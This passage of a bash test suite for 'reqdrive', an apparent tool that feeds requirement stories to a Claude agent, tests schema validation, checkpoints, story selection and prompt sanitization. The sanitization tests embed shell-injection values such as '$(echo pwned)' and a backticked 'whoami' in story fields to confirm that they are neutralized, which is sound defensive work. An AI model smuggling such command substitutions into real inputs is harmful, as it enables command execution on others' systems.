test_result "schema: validate_config_schema rejects non-array prLabels" $?

# Test: validate_config_schema reports multiple errors at once
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  output=$(validate_config_schema "$REQDRIVE_ROOT/tests/fixtures/invalid-manifest-missing-fields.json" 2>&1) && exit 1
  echo "$output" | grep -q "requirementsDir must be a string" &&
  echo "$output" | grep -q "maxIterations must be a number" &&
  echo "$output" | grep -q "prLabels must be an array"
)
test_result "schema: validate_config_schema reports multiple type errors" $?

echo ""
echo "--- Schema: validate_prd_schema ---"

# Test: validate_prd_schema passes for valid PRD fixture
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  validate_prd_schema "$REQDRIVE_ROOT/tests/fixtures/valid-prd.json" 2>/dev/null
)
test_result "schema: validate_prd_schema passes for valid PRD" $?

# Test: validate_prd_schema rejects invalid JSON
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo 'not json' > "$TEST_TEMP/bad-prd.json"
  ! validate_prd_schema "$TEST_TEMP/bad-prd.json" 2>/dev/null
)
test_result "schema: validate_prd_schema rejects invalid JSON" $?

# Test: validate_prd_schema rejects missing project field
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"sourceReq":"REQ-01","userStories":[]}' > "$TEST_TEMP/no-project.json"
  output=$(validate_prd_schema "$TEST_TEMP/no-project.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing required field: project"
)
test_result "schema: validate_prd_schema rejects missing project" $?

# Test: validate_prd_schema rejects missing sourceReq field
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"project":"Test","userStories":[]}' > "$TEST_TEMP/no-req.json"
  output=$(validate_prd_schema "$TEST_TEMP/no-req.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing required field: sourceReq"
)
test_result "schema: validate_prd_schema rejects missing sourceReq" $?

# Test: validate_prd_schema rejects missing userStories
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  output=$(validate_prd_schema "$REQDRIVE_ROOT/tests/fixtures/invalid-prd-missing-stories.json" 2>&1) && exit 1
  echo "$output" | grep -q "userStories"
)
test_result "schema: validate_prd_schema rejects missing userStories" $?

# Test: validate_prd_schema rejects non-array userStories
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"project":"Test","sourceReq":"REQ-01","userStories":"not-array"}' > "$TEST_TEMP/bad-stories.json"
  output=$(validate_prd_schema "$TEST_TEMP/bad-stories.json" 2>&1) && exit 1
  echo "$output" | grep -q "userStories must be an array"
)
test_result "schema: validate_prd_schema rejects non-array userStories" $?

# Test: validate_prd_schema passes with empty stories array
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"project":"Test","sourceReq":"REQ-01","userStories":[]}' > "$TEST_TEMP/empty-stories.json"
  validate_prd_schema "$TEST_TEMP/empty-stories.json" 2>/dev/null
)
test_result "schema: validate_prd_schema passes with empty stories array" $?

# Test: validate_prd_schema rejects story missing id
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/no-id.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"title":"X","acceptanceCriteria":["a"]}]}
EOF
  output=$(validate_prd_schema "$TEST_TEMP/no-id.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing id"
)
test_result "schema: validate_prd_schema rejects story missing id" $?

# Test: validate_prd_schema rejects story missing title
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/no-title.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","acceptanceCriteria":["a"]}]}
EOF
  output=$(validate_prd_schema "$TEST_TEMP/no-title.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing title"
)
test_result "schema: validate_prd_schema rejects story missing title" $?

# Test: validate_prd_schema rejects story missing acceptanceCriteria
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/no-ac.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X"}]}
EOF
  output=$(validate_prd_schema "$TEST_TEMP/no-ac.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing acceptanceCriteria"
)
test_result "schema: validate_prd_schema rejects story missing acceptanceCriteria" $?

# Test: validate_prd_schema rejects non-array acceptanceCriteria
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/bad-ac.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X","acceptanceCriteria":"not-array"}]}
EOF
  output=$(validate_prd_schema "$TEST_TEMP/bad-ac.json" 2>&1) && exit 1
  echo "$output" | grep -q "acceptanceCriteria must be an array"
)
test_result "schema: validate_prd_schema rejects non-array acceptanceCriteria" $?

# Test: validate_prd_schema rejects non-boolean passes
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/bad-passes.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X","acceptanceCriteria":["a"],"passes":"yes"}]}
EOF
  output=$(validate_prd_schema "$TEST_TEMP/bad-passes.json" 2>&1) && exit 1
  echo "$output" | grep -q "passes must be a boolean"
)
test_result "schema: validate_prd_schema rejects non-boolean passes" $?

# Test: validate_prd_schema rejects non-number priority
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/bad-priority.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X","acceptanceCriteria":["a"],"priority":"high"}]}
EOF
  output=$(validate_prd_schema "$TEST_TEMP/bad-priority.json" 2>&1) && exit 1
  echo "$output" | grep -q "priority must be a number"
)
test_result "schema: validate_prd_schema rejects non-number priority" $?

# Test: validate_prd_schema passes when priority is missing (optional)
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  cat > "$TEST_TEMP/no-priority.json" <<'EOF'
{"project":"T","sourceReq":"REQ-01","userStories":[{"id":"US-001","title":"X","acceptanceCriteria":["a"],"passes":false}]}
EOF
  validate_prd_schema "$TEST_TEMP/no-priority.json" 2>/dev/null
)
test_result "schema: validate_prd_schema passes when priority is missing" $?

echo ""
echo "--- Schema: validate_checkpoint_schema ---"

# Test: validate_checkpoint_schema passes for valid checkpoint fixture
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  validate_checkpoint_schema "$REQDRIVE_ROOT/tests/fixtures/valid-checkpoint.json" 2>/dev/null
)
test_result "schema: validate_checkpoint_schema passes for valid checkpoint" $?

# Test: validate_checkpoint_schema rejects invalid JSON
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo 'not json' > "$TEST_TEMP/bad-cp.json"
  ! validate_checkpoint_schema "$TEST_TEMP/bad-cp.json" 2>/dev/null
)
test_result "schema: validate_checkpoint_schema rejects invalid JSON" $?

# Test: validate_checkpoint_schema rejects missing req_id
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"branch":"b","iteration":1}' > "$TEST_TEMP/no-reqid.json"
  output=$(validate_checkpoint_schema "$TEST_TEMP/no-reqid.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing required field: req_id"
)
test_result "schema: validate_checkpoint_schema rejects missing req_id" $?

# Test: validate_checkpoint_schema rejects missing branch
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"req_id":"REQ-01","iteration":1}' > "$TEST_TEMP/no-branch.json"
  output=$(validate_checkpoint_schema "$TEST_TEMP/no-branch.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing required field: branch"
)
test_result "schema: validate_checkpoint_schema rejects missing branch" $?

# Test: validate_checkpoint_schema rejects missing iteration
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"req_id":"REQ-01","branch":"b"}' > "$TEST_TEMP/no-iter.json"
  output=$(validate_checkpoint_schema "$TEST_TEMP/no-iter.json" 2>&1) && exit 1
  echo "$output" | grep -q "missing required field: iteration"
)
test_result "schema: validate_checkpoint_schema rejects missing iteration" $?

# Test: validate_checkpoint_schema rejects non-number iteration
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"req_id":"REQ-01","branch":"b","iteration":"three"}' > "$TEST_TEMP/bad-iter.json"
  output=$(validate_checkpoint_schema "$TEST_TEMP/bad-iter.json" 2>&1) && exit 1
  echo "$output" | grep -q "iteration must be a number"
)
test_result "schema: validate_checkpoint_schema rejects non-number iteration" $?

echo ""
echo "--- Iteration Summary Tests ---"

# Test: extract_iteration_summary extracts valid summary
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  mkdir -p "$TEST_TEMP/agent"

  # Simulate agent output with summary block
  output='Some implementation output here...

```json:iteration-summary
{
  "storyId": "US-003",
  "action": "implemented",
  "filesChanged": ["src/filter.ts"],
  "testsRun": true,
  "testsPassed": true,
  "committed": true,
  "notes": "Added filter dropdown"
}
```'

  extract_iteration_summary "$output" "$TEST_TEMP/agent" 1 2>/dev/null
  [ -f "$TEST_TEMP/agent/iteration-1.summary.json" ] &&
  jq -r '.storyId' "$TEST_TEMP/agent/iteration-1.summary.json" | grep -q "US-003"
)
test_result "summary: extract_iteration_summary extracts valid block" $?

# Test: extract_iteration_summary handles missing summary gracefully
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  mkdir -p "$TEST_TEMP/agent2"

  output="Just some regular output without a summary block."
  extract_iteration_summary "$output" "$TEST_TEMP/agent2" 1 2>/dev/null
  # Should not create summary file
  [ ! -f "$TEST_TEMP/agent2/iteration-1.summary.json" ]
)
test_result "summary: handles missing summary gracefully" $?

echo ""
echo "--- Implementation Prompt Sanitization Tests ---"

# Test: build_implementation_prompt neutralizes $(cmd) in story title
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  prompt_file="$TEST_TEMP/prompt-inject.md"
  story_json='{"title":"$(echo pwned)","description":"normal","acceptanceCriteria":["done"],"id":"US-001","priority":1,"passes":false}'
  sanitized_content="Some requirement text"

  build_implementation_prompt "$prompt_file" "US-001" "$story_json" "$sanitized_content"

  # The literal string $(echo pwned) must NOT have been expanded
  grep -q '$(echo pwned)' "$prompt_file" || grep -q '\$(echo pwned)' "$prompt_file"
  # And the word "pwned" must not appear alone (i.e., it was not executed)
  ! grep -qx 'pwned' "$prompt_file"
)
test_result "impl prompt: neutralizes \$(cmd) in story title" $?

# Test: build_implementation_prompt neutralizes backticks in story description
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  prompt_file="$TEST_TEMP/prompt-backtick.md"
  story_json='{"title":"Safe title","description":"Use `whoami` to attack","acceptanceCriteria":["done"],"id":"US-002","priority":1,"passes":false}'
  sanitized_content="Some requirement text"

  build_implementation_prompt "$prompt_file" "US-002" "$story_json" "$sanitized_content"

  # Backtick command substitution must not produce raw command output
  # sanitize_for_prompt replaces backticks with single quotes
  if grep -q '`whoami`' "$prompt_file"; then
    echo "unexpected: backtick command substitution present" >&2
    exit 1
  fi
  # Positive: the sanitized description must actually be present.
  grep -q "Use 'whoami' to attack" "$prompt_file"
  grep -q '\*\*Title:\*\* Safe title' "$prompt_file"
)
test_result "impl prompt: neutralizes backticks in story description" $?

# Test: build_implementation_prompt neutralizes ${VAR} in acceptance criteria
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  prompt_file="$TEST_TEMP/prompt-varexp.md"
  story_json='{"title":"Normal","description":"Normal","acceptanceCriteria":["Check ${HOME} variable"],"id":"US-003","priority":1,"passes":false}'
  sanitized_content="Some requirement text"

  build_implementation_prompt "$prompt_file" "US-003" "$story_json" "$sanitized_content"

  # ${HOME} must not have been expanded to the actual home directory
  if grep -q "$HOME" "$prompt_file"; then
    echo "unexpected: \$HOME expanded to actual home directory" >&2
    exit 1
  fi
  # Positive: the criterion text must actually be present.
  grep -q 'Check ${HOME} variable' "$prompt_file"
  grep -q 'US-003' "$prompt_file"
)
test_result "impl prompt: neutralizes \${VAR} in acceptance criteria" $?

echo ""
echo "--- CLI Tests ---"

# Test: --version shows version (no claude needed)
(
  set -e
  output=$("$REQDRIVE_ROOT/bin/reqdrive" --version 2>&1)
  echo "$output" | grep -q "0.3.0"
)
test_result "cli: --version shows 0.3.0" $?

# Test: --help shows usage (no claude needed)
(
  set -e
  output=$("$REQDRIVE_ROOT/bin/reqdrive" --help 2>&1)
  echo "$output" | grep -q "Usage:" &&
  echo "$output" | grep -q "init" &&
  echo "$output" | grep -q "run" &&
  echo "$output" | grep -q "validate"
)
test_result "cli: --help shows usage" $?

# Test: --help shows new flags
(
  set -e
  output=$("$REQDRIVE_ROOT/bin/reqdrive" --help 2>&1)
  echo "$output" | grep -q "\-\-interactive" &&
  echo "$output" | grep -q "\-\-unsafe" &&
  echo "$output" | grep -q "\-\-force" &&
  echo "$output" | grep -q "\-\-resume"
)
test_result "cli: --help shows security flags" $?

# Test: unknown command shows error (no claude needed)
(
  set -e
  output=$("$REQDRIVE_ROOT/bin/reqdrive" unknown-cmd 2>&1) || true
  echo "$output" | grep -q "Unknown command"
)
test_result "cli: unknown command shows error" $?

# Test: validate command works (no claude needed)
(
  set -e
  cd "$TEST_TEMP"
  mkdir -p docs/requirements
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements","testCommand":"npm test"}
EOF
  output=$("$REQDRIVE_ROOT/bin/reqdrive" validate 2>&1)
  echo "$output" | grep -q "Validation PASSED"
)
test_result "cli: validate command works" $?

# Test: run requires REQ-ID (requires claude)
if [ "$HAS_CLAUDE" = "true" ]; then
  (
    set -e
    cd "$TEST_TEMP"
    cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements"}
EOF
    output=$("$REQDRIVE_ROOT/bin/reqdrive" run 2>&1) || true
    echo "$output" | grep -q "Usage: reqdrive run"
  )
  test_result "cli: run requires REQ-ID argument" $?
else
  test_skip "cli: run requires REQ-ID argument" "claude not available"
fi

echo ""
echo "--- Run State: write_run_status ---"

# Test: write_run_status creates valid run.json with all fields
(
  set -e
  mkdir -p "$TEST_TEMP/run-state"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  write_run_status "$TEST_TEMP/run-state" "running" "REQ-01"
  [ -f "$TEST_TEMP/run-state/run.json" ] &&
  jq -r '.status' "$TEST_TEMP/run-state/run.json" | grep -q "running" &&
  jq -r '.req_id' "$TEST_TEMP/run-state/run.json" | grep -q "REQ-01" &&
  jq -r '.pid' "$TEST_TEMP/run-state/run.json" | grep -q "[0-9]" &&
  jq -r '.started_at' "$TEST_TEMP/run-state/run.json" | grep -q "."
)
test_result "run_status: creates valid run.json with all fields" $?

# Test: write_run_status preserves started_at on subsequent calls
(
  set -e
  mkdir -p "$TEST_TEMP/run-state2"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  write_run_status "$TEST_TEMP/run-state2" "running" "REQ-01"
  first_started=$(jq -r '.started_at' "$TEST_TEMP/run-state2/run.json")

  sleep 1
  write_run_status "$TEST_TEMP/run-state2" "completed" "REQ-01" "5" "0"
  second_started=$(jq -r '.started_at' "$TEST_TEMP/run-state2/run.json")

  [ "$first_started" = "$second_started" ]
)
test_result "run_status: preserves started_at on subsequent calls" $?

# Test: write_run_status records current PID
(
  set -e
  mkdir -p "$TEST_TEMP/run-state3"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  write_run_status "$TEST_TEMP/run-state3" "running" "REQ-01"
  recorded_pid=$(jq -r '.pid' "$TEST_TEMP/run-state3/run.json")
  [ "$recorded_pid" = "$$" ]
)
test_result "run_status: records current PID" $?

echo ""
echo "--- Checkpoint: save/load ---"

# Test: save_checkpoint creates valid checkpoint.json
(
  set -e
  mkdir -p "$TEST_TEMP/cp-test"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  # Create a mock PRD
  cat > "$TEST_TEMP/cp-test/prd.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":true},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":false}
]}
PRDEOF

  save_checkpoint "$TEST_TEMP/cp-test" "REQ-01" "reqdrive/req-01" 3 "$TEST_TEMP/cp-test/prd.json" 2>/dev/null
  [ -f "$TEST_TEMP/cp-test/checkpoint.json" ] &&
  jq -r '.req_id' "$TEST_TEMP/cp-test/checkpoint.json" | grep -q "REQ-01" &&
  jq -r '.branch' "$TEST_TEMP/cp-test/checkpoint.json" | grep -q "reqdrive/req-01" &&
  [ "$(jq -r '.iteration' "$TEST_TEMP/cp-test/checkpoint.json")" = "3" ]
)
test_result "checkpoint: save_checkpoint creates valid checkpoint.json" $?

# Test: save_checkpoint records completed story IDs
(
  set -e
  mkdir -p "$TEST_TEMP/cp-test2"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/cp-test2/prd.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":true},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":false}
]}
PRDEOF

  save_checkpoint "$TEST_TEMP/cp-test2" "REQ-01" "reqdrive/req-01" 2 "$TEST_TEMP/cp-test2/prd.json" 2>/dev/null
  jq -r '.stories_complete[0]' "$TEST_TEMP/cp-test2/checkpoint.json" | grep -q "US-001" &&
  [ "$(jq '.stories_complete | length' "$TEST_TEMP/cp-test2/checkpoint.json")" = "1" ]
)
test_result "checkpoint: records completed story IDs from PRD" $?

# Test: load_checkpoint returns path for matching req_id
(
  set -e
  mkdir -p "$TEST_TEMP/cp-load"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/cp-load/checkpoint.json" <<'CPEOF'
{"version":"0.3.0","req_id":"REQ-01","branch":"reqdrive/req-01","iteration":2,"timestamp":"2026-01-01T00:00:00+00:00"}
CPEOF

  result=$(load_checkpoint "$TEST_TEMP/cp-load" "REQ-01" 2>/dev/null)
  [ -n "$result" ] && [[ "$result" == *"checkpoint.json" ]]
)
test_result "checkpoint: load returns path for matching req_id" $?

# Test: load_checkpoint returns empty for mismatched req_id
(
  set -e
  mkdir -p "$TEST_TEMP/cp-load2"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/cp-load2/checkpoint.json" <<'CPEOF'
{"version":"0.3.0","req_id":"REQ-01","branch":"reqdrive/req-01","iteration":2,"timestamp":"2026-01-01T00:00:00+00:00"}
CPEOF

  result=$(load_checkpoint "$TEST_TEMP/cp-load2" "REQ-99" 2>/dev/null)
  [ -z "$result" ]
)
test_result "checkpoint: load returns empty for mismatched req_id" $?

# Test: load_checkpoint returns empty for missing file
(
  set -e
  mkdir -p "$TEST_TEMP/cp-load3"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  result=$(load_checkpoint "$TEST_TEMP/cp-load3" "REQ-01" 2>/dev/null)
  [ -z "$result" ]
)
test_result "checkpoint: load returns empty for missing file" $?

# Test: save_checkpoint includes last_commit_sha field
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  git init -q
  git config user.email "test@test.com"
  git config user.name "Test"
  touch f.txt && git add f.txt && git commit -q -m "init"

  mkdir -p "$tmpdir/cp-sha"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$tmpdir/cp-sha/prd.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[]}
PRDEOF

  save_checkpoint "$tmpdir/cp-sha" "REQ-01" "reqdrive/req-01" 1 "$tmpdir/cp-sha/prd.json" 2>/dev/null
  # Verify last_commit_sha field exists and is not empty
  sha=$(jq -r '.last_commit_sha' "$tmpdir/cp-sha/checkpoint.json")
  [ -n "$sha" ] && [ "$sha" != "null" ]
)
test_result "checkpoint: save_checkpoint includes last_commit_sha" $?

echo ""
echo "--- Story Selection ---"

# Test: select_next_story returns lowest-priority incomplete story
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-prd.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":true},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":false},
  {"id":"US-003","title":"C","acceptanceCriteria":["c"],"priority":3,"passes":false}
]}
PRDEOF

  result=$(select_next_story "$TEST_TEMP/story-prd.json")
  [ "$result" = "US-002" ]
)
test_result "story: select_next_story returns lowest-priority incomplete" $?

# Test: select_next_story returns empty when all stories pass
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-done.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":true},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":true}
]}
PRDEOF

  result=$(select_next_story "$TEST_TEMP/story-done.json")
  [ -z "$result" ]
)
test_result "story: select_next_story returns empty when all pass" $?

# Test: select_next_story returns empty when no PRD file
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  result=$(select_next_story "$TEST_TEMP/nonexistent-prd.json")
  [ -z "$result" ]
)
test_result "story: select_next_story returns empty for missing PRD" $?

# Test: get_story_details returns correct story JSON by ID
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-detail.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"First Story","acceptanceCriteria":["a"],"priority":1,"passes":false},
  {"id":"US-002","title":"Second Story","acceptanceCriteria":["b"],"priority":2,"passes":false}
]}
PRDEOF

  result=$(get_story_details "$TEST_TEMP/story-detail.json" "US-002")
  echo "$result" | jq -r '.title' | grep -q "Second Story"
)
test_result "story: get_story_details returns correct story by ID" $?

# Test: select_next_story skips stories with attempts >= max
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-retry.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":false,"attempts":3},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":false,"attempts":1}
]}
PRDEOF

  result=$(select_next_story "$TEST_TEMP/story-retry.json" 3)
  [ "$result" = "US-002" ]
)
test_result "story: select_next_story skips stories with attempts >= max" $?

# Test: select_next_story returns story with attempts < max
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-retry2.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":false,"attempts":2},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":false}
]}
PRDEOF

  result=$(select_next_story "$TEST_TEMP/story-retry2.json" 3)
  [ "$result" = "US-001" ]
)
test_result "story: select_next_story returns story with attempts < max" $?

# Test: select_next_story returns empty when all stories exhausted
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-exhausted.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":false,"attempts":3},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2,"passes":true}
]}
PRDEOF

  result=$(select_next_story "$TEST_TEMP/story-exhausted.json" 3)
  [ -z "$result" ]
)
test_result "story: select_next_story returns empty when all exhausted" $?

# Test: select_next_story selects a story omitting passes
(
  set -e
  export REQDRIVE_ROOT
